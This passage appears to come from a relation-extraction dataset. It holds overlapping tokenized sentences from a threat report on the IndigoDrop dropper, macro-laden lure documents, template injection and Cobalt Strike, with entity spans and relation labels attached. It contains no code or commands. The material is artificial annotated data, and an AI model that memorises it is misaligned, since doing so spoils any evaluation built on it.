"evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [0], "h": 1, "t": 2}, {"r": "EX", "evidence": [1], "h": 3, "t": 4}, {"r": "CO", "evidence": [1, 2], "h": 4, "t": 6}, {"r": "CO", "evidence": [1, 2], "h": 4, "t": 5}, {"r": "RD", "evidence": [3], "t": 7, "h": 8}, {"r": "IJ", "evidence": [3], "h": 9, "t": 11}, {"r": "CO", "evidence": [3], "h": 9, "t": 10}, {"r": "CO", "evidence": [3], "t": 8, "h": 9}, {"r": "ST", "evidence": [4], "h": 12, "t": 13}, {"r": "FR", "evidence": [4], "h": 12, "t": 14}, {"r": "FR", "evidence": [4], "h": 12, "t": 15}, {"r": "ST", "evidence": [4, 5], "h": 15, "t": 16}, {"r": "RF", "evidence": [4, 5], "h": 15, "t": 16}, {"r": "RD", "evidence": [4, 5, 6], "h": 15, "t": 18}, {"r": "WR", "evidence": [4, 5, 6], "h": 15, "t": 18}, {"r": "RD", "evidence": [4, 5, 6], "h": 15, "t": 19}, {"r": "EX", "evidence": [4, 5, 6], "h": 15, "t": 18}, {"r": "WR", "evidence": [4, 5, 6], "h": 15, "t": 19}, {"r": "CO", "evidence": [4, 5], "h": 14, "t": 17}, {"r": "RD", "evidence": [5, 6], "h": 17, "t": 19}]}, {"title": "643-0", "sents": [["IndigoDrop", "is", "responsible", "for", "obtaining", "the", "final", "payload", "from", "a", "download", "URL", "for", "deployment", "."], ["So", "what", "?", "This", "attack", "demonstrates", "how", "the", "adversary", "operates", "a", "targeted", "attack", "that", ":", "Uses", "legitimate-looking", "lures", "to", "trick", "the", "target", "into", "infecting", "themselves", "."], ["Employs", "a", "highly", "modular", "infection", "chain", "(", "implemented", "in", "the", "IndigoDrop", ")", "to", "instrument", "the", "final", "payload", "."], ["Uses", "an", "existing", "offensive", "framework", "(", "Cobalt", "Strike", ")", "to", "establish", "control", "and", "persist", "in", "the", "target", "'", "s", "network", "without", "having", "to", "develop", "a", "bespoke", "remote", "access", "trojan", "(", "RAT", ")", "."], ["Analysis", "of", "maldocsThis", "attack", "uses", "two", "techniques", "to", "deliver", "malicious", "macros", "to", "be", "executed", "on", "the", "target", "'", "s", "endpoint", ":", "Malicious", "macros", "already", "embedded", ",", "ready", "to", "execute", "."], ["Malicious", "macro", "downloaded", "as", "part", "of", "an", "externally", "linked", "template", "that", "is", "then", "injected", "into", "the", "original", "lure", "maldoc", "."], ["These", "documents", "are", "aptly", "named", ":", "IAP39003.doc", "-", "Contains", "embedded", "malicious", "macro", "."], ["IAP39031.docx", "-", "Uses", "template", "injection", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "IndigoDrop", "pos": [0, 1], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [7, 7], "name": "payload", "pos": [7, 8], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [11, 11], "name": "URL", "pos": [11, 12], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [19, 19], "name": "attack", "pos": [4, 5], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [23, 23], "name": "adversary", "pos": [8, 9], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [27, 27], "name": "attack", "pos": [12, 13], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [31, 31], "name": "legitimate-looking lures", "pos": [16, 18], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [45, 45], "name": "infection chain", "pos": [4, 6], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [51, 51], "name": "IndigoDrop", "pos": [10, 11], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [57, 57], "name": "payload", "pos": [16, 17], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [63, 63], "name": "framework", "pos": [4, 5], "index": "10_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [78, 78], "name": "network", "pos": [19, 20], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [87, 87], "name": "trojan ( RAT", "pos": [28, 31], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [95, 95], "name": "attack", "pos": [3, 4], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [102, 102], "name": "macros", "pos": [10, 11], "index": "14_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [111, 111], "name": "endpoint", "pos": [19, 20], "index": "15_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [114, 114], "name": "macros", "pos": [22, 23], "index": "16_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [123, 123], "name": "macro", "pos": [1, 2], "index": "17_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [131, 131], "name": "template", "pos": [9, 10], "index": "18_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [143, 143], "name": "documents", "pos": [1, 2], "index": "19_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [148, 148], "name": "IAP39003.doc", "pos": [6, 7], "index": "20_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [153, 153], "name": "macro", "pos": [11, 12], "index": "21_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [155, 155], "name": "IAP39031.docx", "pos": [0, 1], "index": "22_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "ST", "evidence": [0], "h": 0, "t": 2}, {"r": "RF", "evidence": [0], "h": 0, "t": 2}, {"r": "FR", "evidence": [1], "h": 4, "t": 5}, {"r": "RD", "evidence": [0, 1], "t": 1, "h": 3}, {"r": "FR", "evidence": [1], "h": 5, "t": 6}, {"r": "CO", "evidence": [1], "h": 3, "t": 5}, {"r": "FR", "evidence": [2], "t": 7, "h": 8}, {"r": "RD", "evidence": [2], "h": 7, "t": 9}, {"r": "ST", "evidence": [3], "h": 10, "t": 11}, {"r": "RF", "evidence": [3], "h": 10, "t": 11}, {"r": "WR", "evidence": [3], "h": 10, "t": 12}, {"r": "WR", "evidence": [3, 4], "t": 12, "h": 13}, {"r": "WR", "evidence": [4], "h": 13, "t": 14}, {"r": "EX", "evidence": [4], "h": 13, "t": 14}, {"r": "ST", "evidence": [4], "h": 13, "t": 15}, {"r": "RF", "evidence": [4], "h": 13, "t": 15}, {"r": "CO", "evidence": [4], "h": 14, "t": 16}, {"r": "CO", "evidence": [5], "h": 17, "t": 18}, {"r": "CO", "evidence": [6], "h": 20, "t": 21}, {"r": "CO", "evidence": [6], "t": 19, "h": 20}, {"r": "CO", "evidence": [6, 7], "h": 20, "t": 22}]}, {"title": "643-1", "sents": [["So", "what", "?", "This", "attack", "demonstrates", "how", "the", "adversary", "operates", "a", "targeted", "attack", "that", ":", "Uses", "legitimate-looking", "lures", "to", "trick", "the", "target", "into", "infecting", "themselves", "."], ["Employs", "a", "highly", "modular", "infection", "chain", "(", "implemented", "in", "the", "IndigoDrop", ")", "to", "instrument", "the", "final", "payload", "."], ["Uses", "an", "existing", "offensive", "framework", "(", "Cobalt", "Strike", ")", "to", "establish", "control", "and", "persist", "in", "the", "target", "'", "s", "network", "without", "having", "to", "develop", "a", "bespoke", "remote", "access", "trojan", "(", "RAT", ")", "."], ["Analysis", "of", "maldocsThis", "attack", "uses", "two", "techniques", "to", "deliver", "malicious", "macros", "to", "be", "executed", "on", "the", "target", "'", "s", "endpoint", ":", "Malicious", "macros", "already", "embedded", ",", "ready", "to", "execute", "."], ["Malicious", "macro", "downloaded", "as", "part", "of", "an", "externally", "linked", "template", "that", "is", "then", "injected", "into", "the", "original", "lure", "maldoc", "."], ["These", "documents", "are", "aptly", "named", ":", "IAP39003.doc", "-", "Contains", "embedded", "malicious", "macro", "."], ["IAP39031.docx", "-", "Uses", "template", "injection", "."], ["Sample", "content", "of", "the", "maldoc", "lures", ":", "Fake", "document", "or", "weaponized", "copy", "?", "Many", "targeted", "attacks", "employing", "maldocs", "observed", "by", "Talos", "usually", "consist", "of", "utmost", "a", "couple", "of", "pages", "of", "decoy", "content", "to", "make", "them", "look", "legitimate", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [4, 4], "name": "attack", "pos": [4, 5], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [8, 8], "name": "adversary", "pos": [8, 9], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [12, 12], "name": "attack", "pos": [12, 13], "index": "2_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [16, 16], "name": "legitimate-looking lures", "pos": [16, 18], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [30, 30], "name": "infection chain", "pos": [4, 6], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [36, 36], "name": "IndigoDrop", "pos": [10, 11], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [42, 42], "name": "payload", "pos": [16, 17], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [48, 48], "name": "framework", "pos": [4, 5], "index": "7_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [63, 63], "name": "network", "pos": [19, 20], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [72, 72], "name": "trojan ( RAT", "pos": [28, 31], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [80, 80], "name": "attack", "pos": [3, 4], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [87, 87], "name": "macros", "pos": [10, 11], "index": "11_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [96, 96], "name": "endpoint", "pos": [19, 20], "index": "12_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [99, 99], "name": "macros", "pos": [22, 23], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [108, 108], "name": "macro", "pos": [1, 2], "index": "14_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [116, 116], "name": "template", "pos": [9, 10], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [128, 128], "name": "documents", "pos": [1, 2], "index": "16_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [133, 133], "name": "IAP39003.doc", "pos": [6, 7], "index": "17_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [138, 138], "name": "macro", "pos": [11, 12], "index": "18_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [140, 140], "name": "IAP39031.docx", "pos": [0, 1], "index": "19_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [154, 154], "name": "document", "pos": [8, 9], "index": "20_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [156, 156], "name": "weaponized copy", "pos": [10, 12], "index": "21_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [161, 161], "name": "attacks", "pos": [15, 16], "index": "22_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [163, 163], "name": "maldocs", "pos": [17, 18], "index": "23_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [176, 176], "name": "decoy content", "pos": [30, 32], "index": "24_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 1, "t": 2}, {"r": "FR", "evidence": [0], "h": 2, "t": 3}, {"r": "CO", "evidence": [0], "h": 0, "t": 2}, {"r": "FR", "evidence": [1], "t": 4, "h": 5}, {"r": "RD", "evidence": [1], "h": 4, "t": 6}, {"r": "ST", "evidence": [2], "h": 7, "t": 8}, {"r": "RF", "evidence": [2], "h": 7, "t": 8}, {"r": "WR", "evidence": [2], "h": 7, "t": 9}, {"r": "WR", "evidence": [2, 3], "t": 9, "h": 10}, {"r": "WR", "evidence": [3], "h": 10, "t": 11}, {"r": "EX", "evidence": [3], "h": 10, "t": 11}, {"r": "ST", "evidence": [3], "h": 10, "t": 12}, {"r": "RF", "evidence": [3], "h": 10, "t": 12}, {"r": "WR", "evidence": [3, 4, 5, 6, 7], "h": 10, "t": 20}, {"r": "WR", "evidence": [3, 4, 5, 6, 7], "h": 10, "t": 21}, {"r": "CO", "evidence": [3], "h": 11, "t": 13}, {"r": "CO", "evidence": [4], "h": 14, "t": 15}, {"r": "CO", "evidence": [5], "h": 17, "t": 18}, {"r": "CO", "evidence": [5], "t": 16, "h": 17}, {"r": "CO", "evidence": [5, 6], "h": 17, "t": 19}, {"r": "WR", "evidence": [7], "t": 20, "h": 22}, {"r": "WR", "evidence": [7], "t": 21, "h": 22}, {"r": "EX", "evidence": [7], "h": 22, "t": 23}, {"r": "WR", "evidence": [7], "h": 22, "t": 24}]}, {"title": "643-2", "sents": [["Employs", "a", "highly", "modular", "infection", "chain", "(", "implemented", "in", "the", "IndigoDrop", ")", "to", "instrument", "the", "final", "payload", "."], ["Uses", "an", "existing", "offensive", "framework", "(", "Cobalt", "Strike", ")", "to", "establish", "control", "and", "persist", "in", "the", "target", "'", "s", "network", "without", "having", "to", "develop", "a", "bespoke", "remote", "access", "trojan", "(", "RAT", ")", "."], ["Analysis", "of", "maldocsThis", "attack", "uses", "two", "techniques", "to", "deliver", "malicious", "macros", "to", "be", "executed", "on", "the", "target", "'", "s", "endpoint", ":", "Malicious", "macros", "already", "embedded", ",", "ready", "to", "execute", "."], ["Malicious", "macro", "downloaded", "as", "part", "of", "an", "externally", "linked", "template", "that", "is", "then", "injected", "into", "the", "original", "lure", "maldoc", "."], ["These", "documents", "are", "aptly", "named", ":", "IAP39003.doc", "-", "Contains", "embedded", "malicious", "macro", "."], ["IAP39031.docx", "-", "Uses", "template", "injection", "."], ["Sample", "content", "of", "the", "maldoc", "lures", ":", "Fake", "document", "or", "weaponized", "copy", "?", "Many", "targeted", "attacks", "employing", "maldocs", "observed", "by", "Talos", "usually", "consist", "of", "utmost", "a", "couple", "of", "pages", "of", "decoy", "content", "to", "make", "them", "look", "legitimate", "."], ["Talos", "also", "found", "a", "benign", "copy", "of", "one", "of", "the", "maldocs", "indicating", "that", "it", "is", "highly", "likely", "that", "the", "attackers", "weaponized", "and", "distributed", "it", "to", "targets", "(", "Benign", "copy", "hash", ":", "0d16b15972d3d0f8a1481db4e2413a2c519e8ac49cd2bf3fca02cfa3ff0be532", ")", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [4, 4], "name": "infection chain", "pos": [4, 6], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [10, 10], "name": "IndigoDrop", "pos": [10, 11], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [16, 16], "name": "payload", "pos": [16, 17], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [22, 22], "name": "framework", "pos": [4, 5], "index": "3_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [37, 37], "name": "network", "pos": [19, 20], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [46, 46], "name": "trojan ( RAT", "pos": [28, 31], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [54, 54], "name": "attack", "pos": [3, 4], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [61, 61], "name": "macros", "pos": [10, 11], "index": "7_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [70, 70], "name": "endpoint", "pos": [19, 20], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [73, 73], "name": "macros", "pos": [22, 23], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [82, 82], "name": "macro", "pos": [1, 2], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [90, 90], "name": "template", "pos": [9, 10], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [102, 102], "name": "documents", "pos": [1, 2], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [107, 107], "name": "IAP39003.doc", "pos": [6, 7], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [112, 112], "name": "macro", "pos": [11, 12], "index": "14_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [114, 114], "name": "IAP39031.docx", "pos": [0, 1], "index": "15_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [128, 128], "name": "document", "pos": [8, 9], "index": "16_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [130, 130], "name": "weaponized copy", "pos": [10, 12], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [135, 135], "name": "attacks", "pos": [15, 16], "index": "18_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [137, 137], "name": "maldocs", "pos": [17, 18], "index": "19_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [150, 150], "name": "decoy content", "pos": [30, 32], "index": "20_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [168, 168], "name": "maldocs", "pos": [10, 11], "index": "21_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [177, 177], "name": "attackers", "pos": [19, 20], "index": "22_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [183, 183], "name": "targets", "pos": [25, 26], "index": "23_0"}]], "labels": [{"r": "FR", "evidence": [0], "t": 0, "h": 1}, {"r": "RD", "evidence": [0], "h": 0, "t": 2}, {"r": "ST", "evidence": [1], "h": 3, "t": 4}, {"r": "RF", "evidence": [1], "h": 3, "t": 4}, {"r": "WR", "evidence": [1], "h": 3, "t": 5}, {"r": "WR", "evidence": [1, 2], "t": 5, "h": 6}, {"r": "WR", "evidence": [2], "h": 6, "t": 7}, {"r": "EX", "evidence": [2], "h": 6, "t": 7}, {"r": "ST", "evidence": [2], "h": 6, "t": 8}, {"r": "RF", "evidence": [2], "h": 6, "t": 8}, {"r": "WR", "evidence": [2, 3, 4, 5, 6], "h": 6, "t": 16}, {"r": "WR", "evidence": [2, 3, 4, 5, 6], "h": 6, "t": 17}, {"r": "CO", "evidence": [2], "h": 7, "t": 9}, {"r": "CO", "evidence": [3], "h": 10, "t": 11}, {"r": "CO", "evidence": [4], "h": 13, "t": 14}, {"r": "CO", "evidence": [4], "t": 12, "h": 13}, {"r": "CO", "evidence": [4, 5], "h": 13, "t": 15}, {"r": "WR", "evidence": [6], "t": 16, "h": 18}, {"r": "WR", "evidence": [6], "t": 17, "h": 18}, {"r": "EX", "evidence": [6], "h": 18, "t": 19}, {"r": "WR", "evidence": [6], "h": 18, "t": 20}, {"r": "RD", "evidence": [7], "t": 21, "h": 22}, {"r": "ST", "evidence": [7], "h": 22, "t": 23}, {"r": "RF", "evidence": [7], "h": 22, "t": 23}]}, {"title": "643-3", "sents": [["Uses", "an", "existing", "offensive", "framework", "(", "Cobalt", "Strike", ")", "to", "establish", "control", "and", "persist", "in", "the", "target", "'", "s", "network", "without", "having", "to", "develop", "a", "bespoke", "remote", "access", "trojan", "(", "RAT", ")", "."], ["Analysis", "of", "maldocsThis", "attack", "uses", "two", "techniques", "to", "deliver", "malicious", "macros", "to", "be", "executed", "on", "the", "target", "'", "s", "endpoint", ":", "Malicious", "macros", "already", "embedded", ",", "ready", "to", "execute", "."], ["Malicious", "macro", "downloaded", "as", "part", "of", "an", "externally", "linked", "template", "that", "is", "then", "injected", "into", "the", "original", "lure", "maldoc", "."], ["These", "documents", "are", "aptly", "named", ":", "IAP39003.doc", "-", "Contains", "embedded", "malicious", "macro", "."], ["IAP39031.docx", "-", "Uses", "template", "injection", "."], ["Sample", "content", "of", "the", "maldoc", "lures", ":", "Fake", "document", "or", "weaponized", "copy", "?", "Many", "targeted", "attacks", "employing", "maldocs", "observed", "by", "Talos", "usually", "consist", "of", "utmost", "a", "couple", "of", "pages", "of", "decoy", "content", "to", "make", "them", "look", "legitimate", "."], ["Talos", "also", "found", "a", "benign", "copy", "of", "one", "of", "the", "maldocs", "indicating", "that", "it", "is", "highly", "likely", "that", "the", "attackers", "weaponized", "and", "distributed", "it", "to", "targets", "(", "Benign", "copy", "hash", ":", "0d16b15972d3d0f8a1481db4e2413a2c519e8ac49cd2bf3fca02cfa3ff0be532", ")", "."], ["Malicious", "VBA", "AnalysisThis", "section", "consists", "of", "an", "analysis", "of", "malicious", "macros", "used", "to", "carry", "out", "the", "attacks", "using", ":", "Locally", "embedded", "malicious", "macros", "andMalicious", "macros", "embedded", "in", "the", "injected", "templates", "downloaded", "from", "a", "remote", "location", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [4, 4], "name": "framework", "pos": [4, 5], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [19, 19], "name": "network", "pos": [19, 20], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [28, 28], "name": "trojan ( RAT", "pos": [28, 31], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [36, 36], "name": "attack", "pos": [3, 4], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [43, 43], "name": "macros", "pos": [10, 11], "index": "4_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [52, 52], "name": "endpoint", "pos": [19, 20], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [55, 55], "name": "macros", "pos": [22, 23], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [64, 64], "name": "macro", "pos": [1, 2], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [72, 72], "name": "template", "pos": [9, 10], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [84, 84], "name": "documents", "pos": [1, 2], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [89, 89], "name": "IAP39003.doc", "pos": [6, 7], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [94, 94], "name": "macro", "pos": [11, 12], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [96, 96], "name": "IAP39031.docx", "pos": [0, 1], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [110, 110], "name": "document", "pos": [8, 9], "index": "13_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [112, 112], "name": "weaponized copy", "pos": [10, 12], "index": "14_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [117, 117], "name": "attacks", "pos": [15, 16], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [119, 119], "name": "maldocs", "pos": [17, 18], "index": "16_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [132, 132], "name": "decoy content", "pos": [30, 32], "index": "17_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [150, 150], "name": "maldocs", "pos": [10, 11], "index": "18_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [159, 159], "name": "attackers", "pos": [19, 20], "index": "19_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [165, 165], "name": "targets", "pos": [25, 26], "index": "20_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [184, 184], "name": "macros", "pos": [10, 11], "index": "21_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [190, 190], "name": "attacks", "pos": [16, 17], "index": "22_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [196, 196], "name": "macros", "pos": [22, 23], "index": "23_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [207, 207], "name": "remote location", "pos": [33, 35], "index": "24_0"}]], "labels": [{"r": "ST", "evidence": [0], "h": 0, "t": 1}, {"r": "RF", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "WR", "evidence": [0, 1], "t": 2, "h": 3}, {"r": "WR", "evidence": [1], "h": 3, "t": 4}, {"r": "EX", "evidence": [1], "h": 3, "t": 4}, {"r": "ST", "evidence": [1], "h": 3, "t": 5}, {"r": "RF", "evidence": [1], "h": 3, "t": 5}, {"r": "WR", "evidence": [1, 2, 3, 4, 5], "h": 3, "t": 13}, {"r": "WR", "evidence": [1, 2, 3, 4, 5], "h": 3, "t": 14}, {"r": "CO", "evidence": [1], "h": 4, "t": 6}, {"r": "CO", "evidence": [2], "h": 7, "t": 8}, {"r": "CO", "evidence": [3], "h": 10, "t": 11}, {"r": "CO", "evidence": [3], "t": 9, "h": 10}, {"r": "CO", "evidence": [3, 4], "h": 10, "t": 12}, {"r": "WR", "evidence": [5], "t": 13, "h": 15}, {"r": "WR", "evidence": [5], "t": 14, "h": 15}, {"r": "EX", "evidence": [5], "h": 15, "t": 16}, {"r": "WR", "evidence": [5], "h": 15, "t": 17}, {"r": "RD", "evidence": [6], "t": 18, "h": 19}, {"r": "ST", "evidence": [6], "h": 19, "t": 20}, {"r": "RF", "evidence": [6], "h": 19, "t": 20}, {"r": "RD", "evidence": [7], "t": 21, "h": 22}, {"r": "RD", "evidence": [7], "h": 22, "t": 23}, {"r": "ST", "evidence": [7], "h": 22, "t": 24}, {"r": "RF", "evidence": [7], "h": 22, "t": 24}]}, {"title": "643-4", "sents": [["Analysis", "of", "maldocsThis", "attack", "uses", "two", "techniques", "to", "deliver", "malicious", "macros", "to", "be", "executed", "on", "the", "target", "'", "s", "endpoint", ":", "Malicious", "macros", "already", "embedded", ",", "ready", "to", "execute", "."], ["Malicious", "macro", "downloaded", "as", "part", "of", "an", "externally", "linked", "template", "that", "is", "then", "injected", "into", "the", "original", "lure", "maldoc", "."], ["These", "documents", "are", "aptly", "named", ":", "IAP39003.doc", "-", "Contains", "embedded", "malicious", "macro", "."], ["IAP39031.docx", "-", "Uses", "template", "injection", "."], ["Sample", "content", "of", "the", "maldoc", "lures", ":", "Fake", "document", "or", "weaponized", "copy", "?", "Many", "targeted", "attacks", "employing", "maldocs", "observed", "by", "Talos", "usually", "consist", "of", "utmost", "a", "couple", "of", "pages", "of", "decoy", "content", "to", "make", "them", "look", "legitimate", "."], ["Talos", "also", "found", "a", "benign", "copy", "of", "one", "of", "the", "maldocs", "indicating", "that", "it", "is", "highly", "likely", "that", "the", "attackers", "weaponized", "and", "distributed", "it", "to", "targets", "(", "Benign", "copy", "hash", ":", "0d16b15972d3d0f8a1481db4e2413a2c519e8ac49cd2bf3fca02cfa3ff0be532", ")", "."], ["Malicious", "VBA", "AnalysisThis", "section", "consists", "of", "an", "analysis", "of", "malicious", "macros", "used", "to", "carry", "out", "the", "attacks", "using", ":", "Locally", "embedded", "malicious", "macros", "andMalicious", "macros", "embedded", "in", "the", "injected", "templates", "downloaded", "from", "a", "remote", "location", "."], ["The", "malicious", "macros", "carry", "out", "the", "following", "malicious", "activities", ":", "Parse", "a", "Windows", "executable", "'", "s", "hardcoded", "bytes", "into", "bytes", "that", "can", "be", "written", "to", "a", "file", "on", "disk", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [3, 3], "name": "attack", "pos": [3, 4], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [10, 10], "name": "macros", "pos": [10, 11], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [19, 19], "name": "endpoint", "pos": [19, 20], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [22, 22], "name": "macros", "pos": [22, 23], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [31, 31], "name": "macro", "pos": [1, 2], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [39, 39], "name": "template", "pos": [9, 10], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [51, 51], "name": "documents", "pos": [1, 2], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [56, 56], "name": "IAP39003.doc", "pos": [6, 7], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [61, 61], "name": "macro", "pos": [11, 12], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [63, 63], "name": "IAP39031.docx", "pos": [0, 1], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [77, 77], "name": "document", "pos": [8, 9], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [79, 79], "name": "weaponized copy", "pos": [10, 12], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [84, 84], "name": "attacks", "pos": [15, 16], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [86, 86], "name": "maldocs", "pos": [17, 18], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [99, 99], "name": "decoy content", "pos": [30, 32], "index": "14_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [117, 117], "name": "maldocs", "pos": [10, 11], "index": "15_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [126, 126], "name": "attackers", "pos": [19, 20], "index": "16_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [132, 132], "name": "targets", "pos": [25, 26], "index": "17_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [151, 151], "name": "macros", "pos": [10, 11], "index": "18_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [157, 157], "name": "attacks", "pos": [16, 17], "index": "19_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [163, 163], "name": "macros", "pos": [22, 23], "index": "20_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [174, 174], "name": "remote location", "pos": [33, 35], "index": "21_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [179, 179], "name": "macros", "pos": [2, 3], "index": "22_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [190, 190], "name": "executable", "pos": [13, 14], "index": "23_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [203, 203], "name": "file", "pos": [26, 27], "index": "24_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "ST", "evidence": [0], "h": 0, "t": 2}, {"r": "RF", "evidence": [0], "h": 0, "t": 2}, {"r": "WR", "evidence": [0, 1, 2, 3, 4], "h": 0, "t": 10}, {"r": "WR", "evidence": [0, 1, 2, 3, 4], "h": 0, "t": 11}, {"r": "CO", "evidence": [0], "h": 1, "t": 3}, {"r": "CO", "evidence": [1], "h": 4, "t": 5}, {"r": "CO", "evidence": [2], "h": 7, "t": 